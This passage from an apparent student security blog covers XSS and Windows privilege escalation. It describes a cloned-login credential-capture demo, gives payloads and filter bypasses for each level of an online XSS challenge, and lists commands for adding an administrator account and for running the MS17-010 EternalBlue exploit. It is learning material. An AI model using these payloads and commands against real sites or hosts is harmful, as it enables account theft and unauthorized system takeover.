loading="lazy"><br>点击存储型xss，<br><img src="https://img-blog.csdnimg.cn/20200502182830554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>自动跳转到克隆的登录界面上，然后输入账号密码登录<br><img src="https://img-blog.csdnimg.cn/20200502181911837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>就会回到原来的网站登录页面。这个时候已经成功拿到了用户名和密码，后面就不管了。<br><img src="https://img-blog.csdnimg.cn/20200502181926710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查看盗取的信息，在kali终端就能看到下面的页面。<br>因为这里我试了两次，所以会有两次的记录。</p><p><img src="https://img-blog.csdnimg.cn/20200502182033363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后试验完成，Ctrl+Z就可以退出了。</p><h1 id="xss之旅"><a href="#xss之旅" class="headerlink" title="xss之旅"></a>xss之旅</h1><p><a href="http://test.ctf8.com/">在线xss平台</a></p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="https://img-blog.csdnimg.cn/20200503172340635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>构造简单的弹框代码成功弹窗即可。<code>&lt;script&gt;alert(1);&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200503172424813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>开始构造一个弹框的代码，发现无法弹框了。<br><img src="https://img-blog.csdnimg.cn/20200503172646989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查看一下源码<br><img src="https://img-blog.csdnimg.cn/20200503172811593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现这里是我插入代码的位置，然后看到插入点是在input标签内部的，所以无法让浏览器识别弹框代码。这里要做的就是将前面的input标签提前闭合，还有后面的<code>&gt;</code>也要给它闭合，而且还要让它弹框。<br>所以这里构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200503172839194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img src="https://img-blog.csdnimg.cn/20200506153538350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>可以看出是尖括号，被转义了，所以尝试换个事件进行弹窗。<br>前面的value值是可以用单引号闭合，后面还有个双引号，可以把它以及后面的语句注释掉。构造payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; onmouseover=alert(1)//</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506154047475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>知识拓展：<br>onmouseover在代码中表示的含义是 ——当鼠标指针移至元素之上时运行脚本<br>还有其他的事件可以选择使用，以下是我找的其他xss可以触发的事件的代码。<br><img src="https://img-blog.csdnimg.cn/20200506154529785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>第四关先用第三关的payload试一下，然后查看源码。</p><p><img src="https://img-blog.csdnimg.cn/20200506154318602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>只需要将第三关的单引号换成双引号即可<br><img src="https://img-blog.csdnimg.cn/20200506154212719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>进行on事件。但是发现on被分开了，中间多了个下划线<code>_</code><br><img src="https://img-blog.csdnimg.cn/20200506155049670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>那就再换构造语句，javascript伪协议<br>JavaScript伪协议介绍<br>将JavaScript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。<br>如果javascript:URL中的javascript代码中含有多个语句，必须使用分号将这些语句分隔开。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:var now = new Date(); &quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot; +now;</span><br><span class="line"><span class="selector-tag">javascript</span> <span class="selector-tag">URL</span>还可以含有只执行动作，但不返回值的<span class="selector-tag">javascript</span>语句</span><br><span class="line"><span class="selector-tag">javascript</span><span class="selector-pseudo">:alert(&quot;hello</span>,<span class="selector-tag">world</span>!&quot;)</span><br></pre></td></tr></table></figure><p>可以使用a标签来进行绕过。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506162150941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p><img src="https://img-blog.csdnimg.cn/20200506162328765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以看出，将href过滤了，还有其他的几个，on还有script都被过滤了。<br>看了大佬的博客，说是str_replace函数进行处理了，使用大小写绕过就行了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/Onload=alert(document.domain)&gt;%0a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506163700295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>知识补充<br>HTML中的svg介绍<br>SVG意为可缩放矢量图形<br>SVG使用XML格式定义图像。<br>SVG文件可以通过以下标签嵌入HTML文档：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">embed</span>&gt;、&lt;<span class="selector-tag">object</span>&gt;或者&lt;<span class="selector-tag">iframe</span>&gt;、也可以使用<span class="selector-tag">svg</span>标签插入。</span><br></pre></td></tr></table></figure><p>闭合触发xss，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg onload=alert(document.domain)&gt;%0a</span><br></pre></td></tr></table></figure><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p><img src="https://img-blog.csdnimg.cn/20200506164055341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里它将我的on过滤了，变成了空格，然后想到了双写绕过<br>payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg oonnload=alert(document.domain)&gt;%0a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506164235773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p><img src="https://img-blog.csdnimg.cn/20200506164949929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以看出href被过滤了，双引号也被过滤了，script也被过滤。这个过滤了这么多东西，要想到通过编码来绕过。<br>HTML编码可以进行绕过，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="selector-id">#106</span>;&amp;<span class="selector-id">#97</span>;&amp;<span class="selector-id">#118</span>;&amp;<span class="selector-id">#97</span>;&amp;<span class="selector-id">#115</span>;&amp;<span class="selector-id">#99</span>;&amp;<span class="selector-id">#114</span>;&amp;<span class="selector-id">#105</span>;&amp;<span class="selector-id">#112</span>;&amp;<span class="selector-id">#116</span>;&amp;<span class="selector-id">#58</span>;&amp;<span class="selector-id">#97</span>;&amp;<span class="selector-id">#108</span>;&amp;<span class="selector-id">#101</span>;&amp;<span class="selector-id">#114</span>;&amp;<span class="selector-id">#116</span>;&amp;<span class="selector-id">#40</span>;&amp;<span class="selector-id">#49</span>;&amp;<span class="selector-id">#41</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506171517900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个是一种情况，还有一种情况是内容过滤，比如说，想通过弹窗事件来弹出某个内容，比如cookie。但是cookie如果被过滤了，<br>可以先将cookie进行base64加密，成一串base64编码，然后<br>atob：将base64进行解码，转换成明文，并通过eval来执行javascript代码。<br>再通过使用eval来执行语句。<br>可以构造一下payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(atob(&#x27;base64编码&#x27;));&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p><img src="https://img-blog.csdnimg.cn/2020051110511482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不合法的话，那就加上<code>http://</code><br><img src="https://img-blog.csdnimg.cn/2020051111233829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>发现，链接是合法了，但是script被过滤了。所以要进行绕过，<br>可以选择使用HTML编码绕过，还可以利用制表符(%09)等方法进行过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一个：</span><br><span class="line">javasc&amp;#x72;ipt:%0dhttp:&#x2F;&#x2F;www.lalala.io%0dalert(1) </span><br><span class="line">第二个：</span><br><span class="line">javascr%09ipt:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200511113926227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这个是将r转换成HTML编码了，当然也可以转换其他的字母，使得绕过script就行。</p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>没有看到注入框，结果找了一会，在控制台看到了隐藏的信息。<br>一个隐藏的表单。<br><img src="https://img-blog.csdnimg.cn/20200529224510949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>猜想可以在这里面进行注入，具体的还要一个一个试。<br>先进行在t_link框里进行注入尝试。，不过失败了。<br><img src="https://img-blog.csdnimg.cn/20200529224634161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>一个个尝试，最后发现在t_sort可以插入<br><img src="https://img-blog.csdnimg.cn/20200529224853425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>主要是尝试在哪个位置可以插入代码。</p><p> 闯关就先到这里吧，然后再把最近接触到的关于xss注入的知识点记录一下。</p><h1 id="xss注入番外"><a href="#xss注入番外" class="headerlink" title="xss注入番外"></a>xss注入番外</h1><ol><li>属性中的xss闭合引入事件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onmouseover=alert(document.domain)&gt;        / /这个是鼠标放在上面就会触发xss，</span></span><br></pre></td></tr></table></figure><p>当然还有其他属性，点击后触发，等触发事件。<br>完整语句是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input/其他的标签 value= 空 onmouseover=&quot;alert(document.domain)&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>列表中的xss事件<br>HTML中的post方式的from表单提交。可以利用，插入xss语句。<br>burpsuite测试xss，使用Burpsuite截取http请求，修改提交参数。<br>闭合触发xss事件，用通过burpsuite在认为可能的地方插入xss代码进行闭合等操作。</li><li>HTML中的svg介绍<br>SVG意为可缩放矢量图形<br>SVG使用XML格式定义图像。<br>SVG文件可以通过以下标签嵌入HTML文档：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed&gt;、&lt;object&gt;或者&lt;iframe&gt;、也可以使用svg标签插入。</span><br><span class="line">闭合触发xss，</span><br><span class="line"><span class="string">&quot;&gt;&lt;svg onload=alert(document.domain)&gt;%0a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">诀窍：`见框就插`。</span></span><br></pre></td></tr></table></figure><ol start="4"><li>HTML表单文本框介绍<br>HTML表单用于搜集不同类型的用户输入。表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等。text定义常规文本输入。<br>属性介绍：</li></ol><ul><li>value 属性规定输入字段的初始值</li><li>readonly属性规定输入字段为只读(不能修改)</li><li>disabled 属性规定输入字段是禁用的。被禁用的元素是不可用和不可点击的。被禁用的元素不会被提交。</li><li>size 属性规定输入字段的尺寸(以字符计)</li><li>maxlength 属性规定输入字段允许的最大长度。<br>如设置maxlength属性，则输入空间不会接受超过所允许数的字符。<br>该属性不会提供任何反馈。如果需要提醒用户，则必须编写JavaScript代码。<br>xss的payload长度计算<br>使用python的内置函数       <code>  len()</code><br>修改时直接修改maxlength参数就可以了。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload 触发xss漏洞</span><br><span class="line"><span class="string">&quot;&gt;&lt;svg/onload=alert(document.domain)&gt;%0a</span></span><br><span class="line"><span class="string">或者：    &quot;</span> onmouseover=alert(document.domain)&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>HTML事件介绍<br><img src="https://img-blog.csdnimg.cn/20200529230142530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></li><li>空格分割属性的xss<br>JavaScript伪协议介绍<br>将JavaScript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。<br>如果javascript:URL中的javascript代码中含有多个语句，必须使用分号将这些语句分隔开。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:var now = new Date(); <span class="string">&quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot;</span> +now;</span><br><span class="line">javascript URL还可以含有只执行动作，但不返回值的javascript语句</span><br><span class="line">javascript:alert(<span class="string">&quot;hello,world!&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="7"><li>绕过过滤domain为空的xss</li></ol><ul><li>双写绕过<br>过滤一个domain，可以制造这样的payload。<br>dodomainmain<br>这个payload使得浏览器将domain过滤掉，剩下的do和main重新构成了domain。</li><li>编码绕过<br>构造payload进行base64加密。<br>eval<br>atob：将base64进行解码，转换成明文，并通过eval来执行javascript代码。<script>eval(atob('base64编码'));</script></li><li>空格绕过：<br>如果浏览器过滤了script关键字或者其他的什么关键字，导致javascript代码无法执行，那么可以考虑空格绕过。</li><li>利用IE特性绕过xss过滤（只适用于IE浏览器）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IE特性：两个反引号``可以闭合一个左边双引号</span><br></pre></td></tr></table></figure><p>CSS绕过<br>CSS特性介绍<br><code>background:url(&quot;javascript:alert(document.domain);&quot;);</code>    设置背景颜色<br>这是利用javascript伪协议执行js，目前只有IE浏览器支持，其他的不支持</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">payload</span>触发<span class="selector-tag">CSS</span></span><br><span class="line"><span class="selector-tag">background-color</span>:<span class="selector-id">#f00</span>;<span class="selector-tag">background</span><span class="selector-pseudo">:url(&quot;javascript</span><span class="selector-pseudo">:alert(document.domain)</span>;&quot;);</span><br></pre></td></tr></table></figure><p>先到这里，后续还有几个不常见的知识点，回头学了再补吧。最近有点累，要期末考试了，也该准备下复习了。睡觉睡觉，今天早点睡，不熬了。<br>对了突然想起来，这个好像是之前学长布置的作业来着，果然还是那个老毛病，不到检查作业最后一刻，绝对不提前写完。哈哈哈。下周十六周，刚刚好，截至周。<br>现在没事回头看看自己写的博客和印象笔记。哈哈学了不少东西呐。<br>从2020.1.12发的第一篇文章到现在4个多月了，看看还是蛮有成就感的。</p><p>嗯！要继续加油啊。</p><p>文末寄语：</p><blockquote><p>在这世上，有些东西是石头无法刻成的，在我们心里，有一块地方是无法锁住的，那块地方叫做希望。——《肖申克的救赎》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.github.io的个人博客网站无法连接问题</title>
      <link href="/2020/08/23/windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E3%80%81MySQL%20UDF%E6%8F%90%E6%9D%83/"/>
      <url>/2020/08/23/windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E3%80%81MySQL%20UDF%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>前言<br>小白一枚，之前听过的比较厉害的操作就是提权，维权。今天学习一下。</p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="提权本质"><a href="#提权本质" class="headerlink" title="提权本质"></a>提权本质</h2><p>提权本质就是提升自己在服务器中的权限，获得更大的权限。<br>例如：在Windows系统下普通用户，通过提权获得Administrator一样的权限；在linux中通过执行编译后的程序，从普通用户权限提升到root账号权限。</p><h2 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h2><p>第一种分类：</p><ul><li>本地提权<br>当前登录到系统是一个普通用户，通过在本地执行的操作和程序来获得更高的权限</li><li>远程提权<br>远程提权是指在远程的机器上对目标服务器进行对应操作和执行程序对目标系统发送数据包，针对目标系统所存在的漏洞来获得最高的权限Administrator或者root。<br>第二种分类</li><li>系统提权<br>针对系统的弱点或者漏洞来提升应的权限</li><li>第三方软件提权<br>利用系统上安装的一些软件(下载的)，通过这些软件来提升权限。<h1 id="windows系统提权基础命令"><a href="#windows系统提权基础命令" class="headerlink" title="windows系统提权基础命令"></a>windows系统提权基础命令</h1></li><li>获取IP地址信息<br>IP地址是计算机在网络中的门牌号，用来寻找计算机的地址。同一台计算机有多个IP地址，可以有外部连接的IP地址，内部IP地址。</li></ul><p>在提权过程中，如果有外网IP地址，可以直接使用3389端口进行远程桌面连接。<br>在windows系统下使用 <code>ipconfig /all</code>查看网卡信息。<br>ipconfig获取的信息其实是不全面的，加个<code>/all</code>可以查看全部网卡信息。一般192.168开头的是私网地址。</p><ul><li>获取端口信息<br>端口是计算机与外部连接的一个接口，每个开放的服务对应一个端口。<br>windows系统下可以使用netstat命令获取端口开放状态。<br><code>netstat -an</code>获取当前主机所有端口的开放情况及网络连接情况。</li><li>获取服务信息和进程信息<br>在windows系统下可以使用<code>tasklist /svc</code>命令获取运行的进程名称、服务、和PID。</li><li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">添加链接描述</a>进程结束、用户管理命令</li></ul><p>1.使用<code>taskkill</code>来结束进程。<code>taskkill /?</code>获取帮助信息。<br>2.在windows系统下，系统访问需要有对应的用户和密码。<br>可以通过以下命令添加用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup administrator username /add</span><br></pre></td></tr></table></figure><h1 id="windows提权辅助工具"><a href="#windows提权辅助工具" class="headerlink" title="windows提权辅助工具"></a>windows提权辅助工具</h1><h2 id="辅助工具介绍"><a href="#辅助工具介绍" class="headerlink" title="辅助工具介绍"></a>辅助工具介绍</h2><p>Windows-Exploit-Suggester此工具将目标补丁与Microsoft漏洞数据库进行比较，以检测目标上潜在的缺失补丁。<br>github项目地址——🔑<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">传送门</a><br>安装环境：python2.7、安装xlrd模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只有一个python2的环境</span></span><br><span class="line">python -m pip install xlrd</span><br><span class="line"><span class="comment">#同时集合python2和python3</span></span><br><span class="line">python2 -m pip install xlrd</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200701141517806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>安装成功。<br>然后执行<code>--update</code>以获取漏洞文件<br><img src="https://img-blog.csdnimg.cn/20200701141914592.png" alt="m0re" loading="lazy"><br>在文件目录下获得一个这样的文件。<br>然后获取一个本机文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>然后使用命令将这些内容写入一个文件中，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; win7.txt</span><br></pre></td></tr></table></figure><p>生成一个win7文件，将它粘贴到辅助工具目录下。<br>使用命令进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --audit -i win7.txt -d <span class="number">2020</span><span class="number">-07</span><span class="number">-01</span>-mssb.xls</span><br></pre></td></tr></table></figure><p>然后对比出来一些重要漏洞<br><img src="https://img-blog.csdnimg.cn/20200701143646121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>如：MS13-055就是13年的第55个漏洞。</p><h1 id="windows远程提权"><a href="#windows远程提权" class="headerlink" title="windows远程提权"></a>windows远程提权</h1><p>在授权的情况下，针对目标机器进行提权。可以首先扫描系统是否存在可利用漏洞，探测是否可以利用。</p><p>如果可以直接获得最高权限，那么就不需要本地提权，直接远程提权拿到最高权限。<br>介绍一个漏洞ms17-010<br>ms17-010是一个安全类型的补丁，MS17-010更新修复了Microsoft Windows中的漏洞。</p><blockquote><p>WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。勒索病毒是自熊猫烧香以来影响力最大的病毒之一。</p></blockquote><p>扫描探测ms17-010漏洞<br>在metasploit下直接利用ms17-010的漏洞扫描模块进行探测。<br>利用metasploit下的<code>windows/smb/ms17_010_eternalblue</code>模块进行远程提权<br>设置完参数就可以进行攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit<span class="comment">#开始执行</span></span><br><span class="line">shell<span class="comment">#使用shell命令/功能</span></span><br><span class="line">whoami<span class="comment">#查询当前登录的用户会发现是windows最高权限system</span></span><br></pre></td></tr></table></figure><p>这个真的厉害，学到了。</p><h2 id="上手操作一下"><a href="#上手操作一下" 